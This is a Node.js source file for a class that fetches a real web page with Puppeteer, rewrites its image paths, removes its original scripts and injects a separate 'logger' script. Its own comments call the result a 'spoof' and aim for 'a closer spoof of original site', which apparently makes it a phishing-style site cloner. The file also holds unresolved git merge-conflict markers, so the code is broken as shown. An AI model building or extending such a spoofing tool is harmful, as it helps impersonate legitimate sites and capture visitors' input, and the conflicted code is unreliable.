const puppet = require('puppeteer')
const cheer = require('cheerio').default
const fs = require('fs')
const {v4: uuid, v4} = require('uuid')
const isURL = require('is-url')
const path = require('path')
const logger_script = fs.readFileSync(path.join(__dirname,'../scripts', 'l.min.js'), 'utf-8')
class Page{
    // vals
    downloaded_page
    rendered_page
    url
    id
    path
    set downloaded_page(html_string){
        this.downloaded_page = html_string
    }
    get downloaded_page(){
        return this.downloaded_page
    }
    set rendered_page(html_string){
        this.rendered_page = html_string
    }
    get rendered_page(){
        return this.rendered_page
    }
    //* CONTRUCTOR
    constructor(url){
        // Initiate download and render
        this.url = url
        this.id = uuid()
        this.path = this.getPath(url)
    }
    async init(url){
        this.downloaded_page = await this.downloadPage(url)
        this.rendered_page = this.renderSpoof(url)
    }
    // TODO fix async problem
    async downloadPage(url){
        console.log('Fetching ' + url)
        try{
        const browser = await puppet.launch() // launch browser
        const page = await browser.newPage() // open page
            await page.goto(url, {
                waitUntil: "networkidle2"
            })
            let page_string = await page.content() // download content
            await page.close() // closes tab
            this.downloaded_page = page_string
            await browser.close() // close browser
            return true
        }
        catch(err){
            return false
        }
    }
    renderSpoof(url){
        console.log('Rendering page')
    //  parse to dom and alter paths
        let dom = cheer.load(this.downloaded_page)
        // replace image paths
        dom('img').each((i, el)=>{
            let src = el.attribs.src
            if(isURL(src)) return
            let newSrc = url + src
            console.log(i + "  " + newSrc)
            el.attribs['src'] = newSrc
        })
<<<<<<< HEAD
        //main
=======
        // branch1
>>>>>>> branch1
        let scripts = dom('script')
        scripts.remove()
        //* Append ID into logger script, then attach to document
        dom('body').append(`<script src="js/l.js"></script>`)
        // set rendered page to active html string for main / route
        this.rendered_page = dom.html()
        console.log(`${url} spoof rendered.`)
    }
    getPath(url){
        // TODO change this to a closer spoof of original site
        return this.id
    }
}
module.exports = Page